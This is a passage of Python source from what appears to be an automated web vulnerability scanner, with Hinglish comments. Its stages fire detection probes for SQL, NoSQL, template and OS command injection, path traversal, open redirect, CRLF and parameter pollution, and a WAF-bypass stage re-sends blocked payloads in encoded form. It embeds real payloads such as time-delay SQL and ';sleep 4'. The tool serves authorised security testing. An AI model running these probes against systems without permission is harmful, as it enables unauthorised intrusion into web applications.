                rec["signals"].append({"waf": tag, "payload": payload})
                break
        if hit or rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="error-sqli %d probes" % spent)
    error_sqli_findings(F, results)
    ok("Stage C done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def error_sqli_findings(F, results):
    """FIX-4: findings derivation - cached replay path par bhi chalti hai."""
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("sqli_error",
                  "Error-based SQL injection (%s)" % rec.get("db"),
                  ep, "Quote-variant probe par DB error fingerprint: %s | signal: %s"
                      % (rec.get("snippet"), json.dumps(rec.get("signals", []))[:300]),
                  evidence_ref="error_sqli.json")
        elif rec.get("verdict") == "WAF_BLOCKED":
            F.add("injection_blocked",
                  "SQLi probes WAF ne block kiye (%s)" % rec["param"],
                  ep, "Signals: %s" % json.dumps(rec.get("signals", []))[:280],
                  evidence_ref="error_sqli.json")


BOOLEAN_PAIRS = [
    ("numeric", lambda orig: ("1 AND 1=1", "1 AND 1=2")),
    ("string", lambda orig: ("%s' AND '1'='1" % (orig or "a"),
                             "%s' AND '1'='2" % (orig or "a"))),
]


def boolean_sqli(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage D: paired boolean oracle (true~baseline AND false-differs)."""
    ck = "stageD:boolean-sqli"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        boolean_sqli_findings(F, cached)
        ok("Stage D replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    budget = int(conf.get("inject_boolean_probes", 16))
    spent = 0
    records = []
    sql_targets = [t for t in targets
                   if "sqli" in (t.get("families") or [])] or list(targets)[:12]
    s404 = meta.get("soft404") or {}
    for t in sql_targets:
        if spent >= budget - 1:
            break
        url, param = t["url"], t["param"]
        if is_confirmed(ctx, url, param, "sqli"):
            continue
        base = baseline_endpoint(http, url, conf, cp, tag="d")
        if not base.get("ok") or not base.get("stable"):
            continue
        orig = get_param_value(url, param)
        numeric = bool(re.match(r"^\d{1,12}$", orig or ""))
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for ctx_name, maker in BOOLEAN_PAIRS:
            if ctx_name == "numeric" and not numeric:
                continue
            if spent >= budget - 1:
                break
            pt, pf = maker(orig)
            rt = _req(http, "GET", set_param(url, param, pt), allow_redirects=False)
            spent += 1
            rf = _req(http, "GET", set_param(url, param, pf), allow_redirects=False)
            spent += 1
            if rt is None or rf is None or rt.error or rf.error:
                continue
            capture(ctx, url, param, pt, rt, note="bool-true")
            capture(ctx, url, param, pf, rf, note="bool-false")
            if is_soft404(rt, s404) and is_soft404(rf, s404):
                continue
            tag, _ = looks_blocking([(rt, base), (rf, base)])
            if tag:
                rec["verdict"] = "WAF_BLOCKED"
                rec["signals"].append({"waf": tag})
                break
            verdict, reason = pair_diff(rt, rf, base)
            if verdict in ("CONFIRMED", "SUSPECTED"):
                rec["verdict"] = verdict
                rec["signals"].append({
                    "context": ctx_name, "true": pt, "false": pf, "reason": reason,
                    "true_status": rt.status, "true_len": len(rt.body),
                    "false_status": rf.status, "false_len": len(rf.body)})
                if verdict == "CONFIRMED":
                    mark_confirmed(ctx, url, param, "sqli")
                break
        if rec["verdict"] != "SAFE" or rec["signals"]:
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="boolean-sqli %d probes" % spent)
    boolean_sqli_findings(F, results)
    ok("Stage D done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def boolean_sqli_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("sqli_boolean", "Boolean-based SQL injection (paired oracle)",
                  ep, "Paired-diff confirmed: %s" % json.dumps(rec.get("signals", []))[:340],
                  evidence_ref="boolean_sqli.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("sqli_boolean", "Boolean-based SQL injection (suspected)",
                  ep, "Partial differential - manual verify: %s"
                      % json.dumps(rec.get("signals", []))[:340],
                  evidence_ref="boolean_sqli.json")
        elif rec.get("verdict") == "WAF_BLOCKED":
            F.add("injection_blocked", "Boolean probes WAF ne block kiye (%s)" % rec["param"],
                  ep, "Signals: %s" % json.dumps(rec.get("signals", []))[:280],
                  evidence_ref="boolean_sqli.json")


TIME_PAYLOADS = [
    ("1 AND SLEEP(3)", "mysql"),
    ("1 AND (SELECT pg_sleep(3))", "postgres"),
    ("'; WAITFOR DELAY '0:0:3'--", "mssql"),
    ("1||DBMS_PIPE.RECEIVE_MESSAGE('w',3)", "oracle"),
]


def time_sqli(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage E: DB-native delay probes (HARD capped, expensive -> double-count)."""
    ck = "stageE:time-sqli"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        time_sqli_findings(F, cached)
        ok("Stage E replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_time_based", True):
        return {"records": [], "stats": {"skipped": "inject_allow_time_based=false"}}
    budget = int(conf.get("inject_time_probes", 6))
    spent = 0
    records = []
    thr = float(conf.get("inject_timing_threshold", 2.5))
    sql_targets = [t for t in targets
                   if "sqli" in (t.get("families") or [])] or list(targets)[:10]
    for t in sql_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        if is_confirmed(ctx, url, param, "sqli"):
            continue
        base = baseline_endpoint(http, url, conf, cp, tag="e")
        if not base.get("ok") or not base.get("stable"):
            continue
        if float(base.get("elapsed_mad", 0.0)) > 0.6:
            continue                      # network jitter baseline - skip
        bmed = float(base.get("elapsed_med", 0.0))
        orig = get_param_value(url, param)
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for payload, db in TIME_PAYLOADS:
            if spent >= budget - 1:
                break
            probe = (orig + payload) if (orig and not orig.strip("'\"")) else payload
            r = _req(http, "GET", set_param(url, param, probe), allow_redirects=False)
            spent += 2                    # FIX-7: expensive = double count
            if r is None or r.error:
                continue
            el = r.elapsed or 0.0
            capture(ctx, url, param, probe, r, note="time-sqli")
            if timing_hit(el, bmed, thr):
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"payload": payload, "db": db,
                                       "elapsed": round(el, 2),
                                       "baseline_med": round(bmed, 2)})
                mark_confirmed(ctx, url, param, "sqli")
                break
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes_x2": spent, "budget": budget,
                                             "threshold": thr}}
    cp.mark(ck, results, summary="time-sqli")
    time_sqli_findings(F, results)
    ok("Stage E done: %d effective probes, %d record(s)" % (spent, len(records)))
    return results


def time_sqli_findings(F, results):
    for rec in results.get("records", []):
        if rec.get("verdict") == "CONFIRMED":
            F.add("sqli_time", "Time-based SQL injection (%s-like delay)"
                  % rec.get("signals", [{}])[0].get("db", "db"),
                  "%s [%s]" % (rec["url"], rec["param"]),
                  "Timing oracle confirmed: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="time_sqli.json")


# ===========================================================================
# STAGE F/G/H: NoSQL / SSTI / CMDI ENGINES (detection-only, hard rules)
# ===========================================================================
def nosql_injection(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage F: $ne/$gt/$regex operator injection (GET + JSON search bodies).
    Login-bypass probe RoE-GATED (default OFF) - sirf apne test accounts."""
    ck = "stageF:nosql"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        nosql_findings(F, cached)
        ok("Stage F replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_nosql", True):
        return {"records": [], "stats": {"skipped": "inject_allow_nosql=false"}}
    budget = int(conf.get("inject_nosql_probes", 8))
    spent = 0
    records = []
    allow_login = bool(conf.get("inject_nosql_login_probe", False))
    nosql_targets = [t for t in targets
                     if "nosql" in (t.get("families") or [])] or \
                    [t for t in targets if re.search(r"(?i)(login|auth|user|email|acct)",
                                                     t["url"] + t["param"])][:6] or list(targets)[:6]
    for t in nosql_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="f")
        if not base.get("ok"):
            continue
        is_login = bool(re.search(r"(?i)(login|signin|auth|token|password)", url))
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        # ---- GET operator probes (query-string style) ----
        for op, mk in NOSQL_GET_PAYLOADS[:3]:
            if spent >= budget:
                break
            val = mk(param)
            payload = "%s[%s]=%s" % (param, op, val)
            r = _req(http, "GET", _nosql_get_url(url, param, op, val),
                     allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, payload, r, note="nosql-get")
            hit, snip = match_nosql_error(r.text)
            if hit:
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"style": "get-operator", "op": op, "snippet": snip})
                mark_confirmed(ctx, url, param, "nosql")
                break
            if r.status == 200 and differs(r, base) and not is_login:
                rec["verdict"] = "SUSPECTED"
                rec["signals"].append({"style": "get-operator", "op": op,
                                       "status": r.status, "len": len(r.body)})
        # ---- JSON body probes (read-only search style; login gated) ----
        if rec["verdict"] == "SAFE" and spent < budget and \
                (allow_login or not is_login):
            for js in NOSQL_JSON_PAYLOADS[:2]:
                if spent >= budget:
                    break
                body = json.dumps({param: js}).encode()
                r = _ro_post(http, url, data=body,
                             headers={"Content-Type": "application/json"})
                spent += 1
                if r is None or r.error:
                    continue
                capture(ctx, url, param, json.dumps({param: js}), r, note="nosql-json")
                hit, snip = match_nosql_error(r.text)
                if hit:
                    rec["verdict"] = "CONFIRMED"
                    rec["signals"].append({"style": "json-operator", "op": list(js)[0],
                                           "snippet": snip})
                    mark_confirmed(ctx, url, param, "nosql")
                    break
                if r.status == 200 and differs(r, base):
                    if is_login and not allow_login:
                        rec["signals"].append({"note": "login JSON anomalous - "
                                                      "RoE gate ke bina probe nahi kiya"})
                        rec["verdict"] = "SUSPECTED"
                    else:
                        rec["verdict"] = "SUSPECTED"
                    rec["signals"].append({"style": "json-operator", "op": list(js)[0],
                                           "status": r.status, "len": len(r.body)})
        if rec["verdict"] != "SAFE" or len(rec["signals"]) > 0:
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget,
                                             "login_probe": allow_login}}
    cp.mark(ck, results, summary="nosql %d probes" % spent)
    nosql_findings(F, results)
    ok("Stage F done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def _nosql_get_url(url, param, op, val):
    """?param[$op]=val classic Mongo query-string injection form."""
    sp, qs = _split_url(url)
    new_q = [(k, v) for k, v in qs if k != param]
    new_q.append(("%s[%s]" % (param, op), val))
    enc = urllib.parse.urlencode(new_q)
    return urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path, enc, sp.fragment))


def nosql_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        login = bool(re.search(r"(?i)(login|signin|auth|token|password)", rec["url"]))
        if rec.get("verdict") == "CONFIRMED":
            F.add("nosql_login_bypass" if (login and any(s.get("style") == "json-operator" or
                                                         s.get("style") == "get-operator"
                                                         for s in rec.get("signals", [])))
                  else "nosql_injection",
                  "NoSQL operator injection %s" % ("(login endpoint)" if login else ""),
                  ep, "Operator accepted: %s" % json.dumps(rec.get("signals", []))[:340],
                  evidence_ref="nosql_injection.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("nosql_injection", "NoSQL operator injection (suspected)", ep,
                  "Anomalous behavior on operator probe: %s"
                  % json.dumps(rec.get("signals", []))[:340],
                  evidence_ref="nosql_injection.json")


def ssti_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage G: SSTI polyglot matrix - SIRF arithmetic render proof (49/7777777)."""
    ck = "stageG:ssti"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        ssti_findings(F, cached)
        ok("Stage G replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_ssti", True):
        return {"records": [], "stats": {"skipped": "inject_allow_ssti=false"}}
    budget = int(conf.get("inject_ssti_probes", 12))
    spent = 0
    records = []
    ssti_targets = [t for t in targets if "ssti" in (t.get("families") or [])] or list(targets)[:8]
    for t in ssti_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="g")
        if not base.get("ok"):
            continue
        if "{{7*7}}" in base.get("text_sample", ""):
            continue                 # already-echoing template - noise
        orig = get_param_value(url, param)
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for payload, engine, expect in SSTI_PAYLOADS:
            if spent >= budget:
                break
            if expect == "7*7":      # engine-confusion probe - skip (ambiguous)
                continue
            probe_val = (orig + payload) if orig and len(orig) <= 24 else payload
            r = _req(http, "GET", set_param(url, param, probe_val), allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, payload, r, note="ssti")
            txt = r.text
            if expect in txt and expect not in base.get("text_sample", ""):
                # 49 kabhi-kabhi baseline content me hota hai - baseline-guard upar
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"payload": payload, "engine": engine,
                                       "rendered": expect})
                mark_confirmed(ctx, url, param, "ssti")
                break
            if payload in txt and rec["verdict"] == "SAFE":
                rec["verdict"] = "SUSPECTED"
                rec["signals"].append({"payload": payload, "note": "verbatim reflect "
                                                              "(render nahi) - context check"})
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="ssti %d probes" % spent)
    ssti_findings(F, results)
    ok("Stage G done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def ssti_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("ssti_detected", "Server-side template injection (%s)"
                  % rec.get("signals", [{}])[0].get("engine", "unknown-engine"),
                  ep, "Arithmetic render proof: %s" % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="ssti_scan.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("ssti_possible", "Template syntax reflect (SSTI possible)", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="ssti_scan.json")


def cmdi_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage H: command injection - SIRF harmless `id` + optional bounded timing."""
    ck = "stageH:cmdi"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        cmdi_findings(F, cached)
        ok("Stage H replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_cmdi", True):
        return {"records": [], "stats": {"skipped": "inject_allow_cmdi=false"}}
    budget = int(conf.get("inject_cmdi_probes", 8))
    spent = 0
    records = []
    cmdi_targets = [t for t in targets if "cmdi" in (t.get("families") or [])] or list(targets)[:8]
    for t in cmdi_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="h")
        if not base.get("ok"):
            continue
        orig = get_param_value(url, param)
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for payload, _tag in CMDI_PAYLOADS:
            if spent >= budget:
                break
            probe = (orig + payload) if orig else payload
            r = _req(http, "GET", set_param(url, param, probe), allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, payload, r, note="cmdi")
            hit, snip = match_cmdi(r.text)
            if hit:
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"payload": payload, "fingerprint": snip})
                mark_confirmed(ctx, url, param, "cmdi")
                break
        # ---- blind timing (bounded, gated) ----
        if rec["verdict"] == "SAFE" and conf.get("inject_cmdi_timing", False) \
                and spent < budget and base.get("stable") \
                and float(base.get("elapsed_mad", 0.0)) <= 0.6:
            for payload in (";sleep 4", "| sleep 4"):
                if spent >= budget - 1:
                    break
                probe = (orig + payload) if orig else payload
                r = _req(http, "GET", set_param(url, param, probe), allow_redirects=False)
                spent += 2                    # FIX-7 double-count
                if r is None or r.error:
                    continue
                el = r.elapsed or 0.0
                if timing_hit(el, float(base.get("elapsed_med", 0.0)),
                              float(conf.get("inject_timing_threshold", 2.5))):
                    rec["verdict"] = "CONFIRMED"
                    rec["signals"].append({"payload": payload, "blind": "timing",
                                           "elapsed": round(el, 2)})
                    mark_confirmed(ctx, url, param, "cmdi")
                    break
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget,
                                             "timing": bool(conf.get("inject_cmdi_timing", False))}}
    cp.mark(ck, results, summary="cmdi %d probes" % spent)
    cmdi_findings(F, results)
    ok("Stage H done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def cmdi_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        sig = rec.get("signals", [{}])[0]
        if rec.get("verdict") == "CONFIRMED":
            blind = bool(sig.get("blind"))
            F.add("cmdi_blind_time" if blind else "cmdi_detected",
                  "Blind OS command injection (timing)" if blind
                  else "OS command injection (id fingerprint)",
                  ep, "Proof: %s" % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="cmdi_scan.json")


# ===========================================================================
# STAGE I/J/K/L: Traversal / Redirect / CRLF / HPP (detection-only)
# ===========================================================================
def traversal_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage I: file/path params x 16 variants - SIRF read-only safe markers."""
    ck = "stageI:traversal"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        traversal_findings(F, cached)
        ok("Stage I replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_traversal", True):
        return {"records": [], "stats": {"skipped": "inject_allow_traversal=false"}}
    budget = int(conf.get("inject_traversal_probes", 16))
    spent = 0
    records = []
    file_targets = [t for t in targets if "file" in (t.get("families") or [])][:8] or \
        [t for t in targets if re.search(r"(?i)(file|path|page|doc|download|template|lang|style)",
                                         t["param"])][:8]
    s404 = meta.get("soft404") or {}
    for t in file_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="i")
        if not base.get("ok"):
            continue
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": [],
               "winning_variant": None}
        for payload, label in TRAVERSAL_PAYLOADS:
            if spent >= budget:
                break
            r = _req(http, "GET", set_param(url, param, payload), allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, payload, r, note="traversal")
            tag, snip = match_traversal_marker(r.text)
            if tag:
                rec["verdict"] = "CONFIRMED"
                rec["winning_variant"] = label
                rec["signals"].append({"payload": payload, "marker": tag,
                                       "snippet": snip, "status": r.status})
                mark_confirmed(ctx, url, param, "file")
                break
            if is_soft404(r, s404):
                continue
            # anomalous non-marker (e.g. 200 big-body) -> hint signal ek hi baar
            if rec["verdict"] == "SAFE" and r.status == 200 and \
                    len(r.body) > 0 and differs(r, base, 0.97):
                rec["verdict"] = "SUSPECTED"
                rec["signals"].append({"payload": payload, "note": "anomalous "
                                       "200 (marker nahi mila)", "len": len(r.body)})
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="traversal %d probes" % spent)
    traversal_findings(F, results)
    ok("Stage I done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def traversal_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            wafish = rec.get("winning_variant") in ("enc-slash", "enc-dot", "double-enc",
                                                    "utf8-overlong", "dotdot-slash-strip",
                                                    "utf8-overlong-dot", "win-nullbyte")
            F.add("traversal_waf_bypass" if wafish else "path_traversal_confirmed",
                  "Arbitrary file read (traversal via %s)" % rec.get("winning_variant"),
                  ep, "Marker file read confirmed: %s"
                      % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="traversal_scan.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("path_traversal_hint", "File param anomalous (traversal hint)", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="traversal_scan.json")


def redirect_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage J: redirect params x canary variants. FIX-6: allow_redirects=False."""
    ck = "stageJ:redirect"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        redirect_findings(F, cached)
        ok("Stage J replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_redirect", True):
        return {"records": [], "stats": {"skipped": "inject_allow_redirect=false"}}
    budget = int(conf.get("inject_redirect_probes", 12))
    spent = 0
    records = []
    canary = (conf.get("inject_redirect_canary") or "example.com").strip("/")
    rd_targets = [t for t in targets if "redirect" in (t.get("families") or [])] or \
        [t for t in targets if re.search(r"(?i)(next|redirect|url|return|dest|goto|continue|"
                                         r"target|link|callback|forward|out)", t["param"])][:8]
    origin = meta.get("origin", "")
    for t in rd_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="j")
        if not base.get("ok"):
            continue
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for maker, label in REDIRECT_VARIANTS:
            if spent >= budget:
                break
            value = maker(canary, origin or urllib.parse.urlsplit(url).scheme + "://" +
                          urllib.parse.urlsplit(url).netloc)
            r = _req(http, "GET", set_param(url, param, value), allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, value, r, note="redirect")
            loc = r.header("Location", "")
            st = r.status or 0
            if loc and canary in loc and (300 <= st < 400):
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"variant": label, "value": value,
                                       "location": loc[:200], "status": st})
                mark_confirmed(ctx, url, param, "redirect")
                break
            if loc and canary in loc:
                rec["verdict"] = "SUSPECTED"
                rec["signals"].append({"variant": label, "location": loc[:200],
                                       "status": st})
            txt = r.text[:2500]
            if canary in txt and re.search(r"(?i)(location\.href|window\.location|"
                                           r"meta http-equiv=.refresh|http-equiv=.refresh)", txt):
                rec["verdict"] = "SUSPECTED" if rec["verdict"] == "SAFE" else rec["verdict"]
                rec["signals"].append({"variant": label, "style": "client-side-redirect"})
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget,
                                             "canary": canary}}
    cp.mark(ck, results, summary="redirect %d probes" % spent)
    redirect_findings(F, results)
    ok("Stage J done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def redirect_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        if rec.get("verdict") == "CONFIRMED":
            F.add("open_redirect_confirmed",
                  "Open redirect (%s)" % rec.get("signals", [{}])[0].get("variant"),
                  ep, "Canary redirect confirmed: %s"
                      % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="redirect_scan.json")
        elif rec.get("verdict") == "SUSPECTED":
            client = any(s.get("style") == "client-side-redirect" for s in rec.get("signals", []))
            F.add("client_redirect_canary" if client else "open_redirect_hint",
                  "Client-side redirect canary (DOM)" if client
                  else "Redirect param reflects canary (hint)", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:320],
                  evidence_ref="redirect_scan.json")


def crlf_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage K: CRLF header injection via %0d%0a marker headers."""
    ck = "stageK:crlf"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        crlf_findings(F, cached)
        ok("Stage K replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_crlf", True):
        return {"records": [], "stats": {"skipped": "inject_allow_crlf=false"}}
    budget = int(conf.get("inject_crlf_probes", 6))
    spent = 0
    records = []
    crlf_targets = [t for t in targets if "redirect" in (t.get("families") or [])] or \
        list(targets)[:6]
    for t in crlf_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="k")
        if not base.get("ok"):
            continue
        orig = get_param_value(url, param)
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        for payload, label in CRLF_PAYLOADS:
            if spent >= budget:
                break
            probe = (orig + payload) if orig else payload
            r = _req(http, "GET", set_param(url, param, probe), allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, payload, r, note="crlf")
            injected = r.header("WASP-Probe", "") or ""
            setc = ";".join(r.set_cookies or [])
            if injected:
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"payload": payload, "style": "header",
                                       "value": injected[:80]})
                mark_confirmed(ctx, url, param, "crlf")
                break
            if "wasp12=" in setc and label == "crlf-cookie":
                rec["verdict"] = "CONFIRMED"
                rec["signals"].append({"payload": payload, "style": "set-cookie"})
                mark_confirmed(ctx, url, param, "crlf")
                break
            if payload in r.text and rec["verdict"] == "SAFE":
                rec["verdict"] = "SUSPECTED"
                rec["signals"].append({"payload": payload, "note": "literal "
                                       "reflect - log-injection hypothesis"})
        if rec["verdict"] != "SAFE":
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="crlf %d probes" % spent)
    crlf_findings(F, results)
    ok("Stage K done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def crlf_findings(F, results):
    for rec in results.get("records", []):
        ep = "%s [%s]" % (rec["url"], rec["param"])
        sig = rec.get("signals", [{}])[0]
        if rec.get("verdict") == "CONFIRMED":
            key = "crlf_cookie_injection" if sig.get("style") == "set-cookie" \
                else "crlf_header_injection"
            F.add(key, "CRLF injection (%s)" % sig.get("style", "header"), ep,
                  "Injected response content: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="crlf_scan.json")
        elif rec.get("verdict") == "SUSPECTED":
            F.add("log_injection_hint", "Log-injection hypothesis (newline reflect)", ep,
                  "Signals: %s" % json.dumps(rec.get("signals", []))[:300],
                  evidence_ref="crlf_scan.json")


def hpp_scan(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage L: HPP - dup-param precedence diff (WAF-vs-backend desync hint)."""
    ck = "stageL:hpp"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        hpp_findings(F, cached)
        ok("Stage L replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_allow_hpp", True):
        return {"records": [], "stats": {"skipped": "inject_allow_hpp=false"}}
    budget = int(conf.get("inject_hpp_probes", 8))
    spent = 0
    records = []
    for t in targets[:16]:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        base = baseline_endpoint(http, url, conf, cp, tag="l")
        if not base.get("ok") or not base.get("stable"):
            continue
        orig = get_param_value(url, param) or "a"
        marker = "wasp_hpp_%s" % rand_str(4)
        r = _req(http, "GET", dup_param(url, param, marker), allow_redirects=False)
        spent += 1
        if r is None or r.error:
            continue
        capture(ctx, url, param, "%s&%s=%s" % (orig, param, marker), r, note="hpp")
        txt = r.text[:3000]
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": []}
        if differs(r, base, 0.97):
            reflected = marker in txt
            both = reflected and orig in txt
            rec["verdict"] = "SUSPECTED"
            rec["signals"].append({"style": "concat-both" if both else
                                   ("last-wins" if reflected else "diff-no-reflect"),
                                   "status": r.status, "len": len(r.body),
                                   "reflected": reflected})
            records.append(rec)
    results = {"records": records, "stats": {"probes": spent, "budget": budget}}
    cp.mark(ck, results, summary="hpp %d probes" % spent)
    hpp_findings(F, results)
    ok("Stage L done: %d probes, %d record(s)" % (spent, len(records)))
    return results


def hpp_findings(F, results):
    for rec in results.get("records", []):
        F.add("hpp_anomaly", "HPP param-precedence anomaly (%s)" % rec["param"],
              "%s [%s]" % (rec["url"], rec["param"]),
              "Duplicate-param behavior differs: %s"
              % json.dumps(rec.get("signals", []))[:300],
              evidence_ref="hpp_scan.json")


# ===========================================================================
# ULTRA STAGES M/N/O/P: WAF-shaping / GraphQL / Deser / Reflection (v12)
# ===========================================================================
def waf_shape_ultra(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage M: WAF-blocked params ko encode-variant se re-probe (WAF ke neeche)."""
    ck = "stageM:waf-shape"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        waf_shape_findings(F, cached)
        ok("Stage M replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    if not conf.get("inject_waf_bypass", True):
        return {"records": [], "stats": {"skipped": "inject_waf_bypass=false"}}
    blocked = list(ctx.get("waf_blocked", []))       # stage C/D ne bhara
    budget = int(conf.get("inject_waf_probes", 10))
    spent = 0
    records = []
    for blk in blocked[:8]:
        if spent >= budget:
            break
        url, param = blk.get("url"), blk.get("param")
        if not url or not param:
            continue
        base = baseline_endpoint(http, url, conf, cp, tag="m")
        if not base.get("ok"):
            continue
        orig = get_param_value(url, param)
        base_payload = blk.get("payload") or (orig + "'") if orig else "'"
        rec = {"url": url, "param": param, "verdict": "SAFE",
               "blocked_payload": base_payload, "signals": [], "winning": None}
        for label, transform in WAF_SHAPE_VARIANTS:
            if spent >= budget:
                break
            try:
                value = transform(base_payload)
            except Exception:
                continue
            r = _req(http, "GET", set_param(url, param, value), allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, value, r, note="waf-shape")
            waf_tag, _ = match_waf_block(r, base)
            if waf_tag:
                continue                       # abhi bhi block hai
            fam, snip = match_sql_error(r.text)
            if fam:
